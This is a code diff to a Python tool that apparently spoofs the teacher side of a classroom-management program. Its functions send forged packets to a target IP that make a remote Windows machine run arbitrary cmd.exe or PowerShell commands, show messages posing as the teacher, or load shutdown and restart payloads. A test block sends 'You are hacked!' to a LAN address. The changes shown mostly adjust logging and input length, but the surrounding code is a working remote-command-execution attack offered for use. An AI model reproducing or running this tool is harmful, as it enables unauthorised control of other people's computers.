@@ -39,6 +39,10 @@ class Payload:
     WINDOWED: bytes = bytes()
 
 
+def _shorten(s: str, length: int = 80) -> str:
+    return s if len(s) <= length else s[:length] + "..."
+
+
 def _resource_dir(relative_dir: str) -> str:
     """
     将资源的相对路径转换为实际路径。
@@ -74,10 +78,11 @@ def _read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: st
         Payload.CMD = f.read()
     with open(windowed_dir, "rb") as f:
         Payload.WINDOWED = f.read()
-    logger.info(f"Read payload from: {shutdown_dir}, {restart_dir}, {msg_dir}, {cmd_dir}, {windowed_dir}")
 
 
 def _validate_ip(ip: str):
+    if ip in ("localhost", "::1"):
+        return True
     ipv4 = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
     ipv6 = re.compile(r'^(([0-9a-fA-F]{1,4}):){7}([0-9a-fA-F]{1,4})$')
     return (ipv4.match(ip) is not None) or (ipv6.match(ip) is not None)
@@ -155,6 +160,7 @@ class Target:
             raise
         except OSError as e:
             logger.error(f"OSError ({type(e).__name__}): {e}")
+            raise
         else:
             logger.debug(f"SEND: length of {len(packet)} -> {address[0]}:{address[1]}")
 
@@ -193,13 +199,16 @@ class Target:
         发送教师端消息（即以教师的口吻）。
         :param content: 消息内容
         """
+        if len(content) > 449:
+            raise OverflowError("msg content is too long to send")
+
         encode_content = self._encode_msg(content)
         packet = bytearray(Payload.MSG)
         for idx, element in enumerate(encode_content, start=56):
             packet[idx] = element
 
         self._safe_sendto(packet, self.address)
-        logger.info(f"MSG: {content} -> {self.address[0]}:{self.address[1]}")
+        logger.info(f"MSG: {_shorten(content)} -> {self.address[0]}:{self.address[1]}")
 
     def raw(self, executable: str, args: str) -> None:
         """
@@ -219,7 +228,7 @@ class Target:
         packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")  # 固定结尾
 
         self._safe_sendto(packet, self.address)
-        logger.debug(f"RAW: {executable} {args} -> {self.address[0]}:{self.address[1]}")
+        logger.debug(f"RAW: {_shorten(f"{executable} {args}")} -> {self.address[0]}:{self.address[1]}")
 
     def cmd(self, command: str, arg: Optional[str] = None) -> None:
         """
@@ -230,7 +239,7 @@ class Target:
         executable = "C:\\WINDOWS\\system32\\cmd.exe"
         args = f"{arg} {command}" if arg else f" {command}"
         self.raw(executable, args)
-        logger.info(f"CMD: {command} {args} -> {self.address[0]}:{self.address[1]}")
+        logger.info(f"CMD: {_shorten(f"{executable} {args}")} -> {self.address[0]}:{self.address[1]}")
 
     def powershell(self, command: str, arg: Optional[str] = None) -> None:
         """构造 Powershell 命令并发送。
@@ -240,7 +249,7 @@ class Target:
         executable = "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
         args = f"{arg} -c \"& {{{command}}}\"" if arg else f" -c \"& {{{command}}}\""
         self.raw(executable, args)
-        logger.info(f"POWERSHELL: {command} {args} -> {self.address[0]}:{self.address[1]}")
+        logger.info(f"POWERSHELL: {_shorten(f"{command} {arg}")} -> {self.address[0]}:{self.address[1]}")
 
 
 def get_local_lan_ip() -> str:
@@ -269,5 +278,5 @@ if __name__ == '__main__':
     ADDR = ("10.165.43.52", 4705)  # edit this test ip before
     send = Target(ADDR)
     send.powershell("Write-Output You are hacked!", "-NoExit")
-    send.msg("HELLO")
+    send.msg("HELLO" * 100)
     send.windowed()
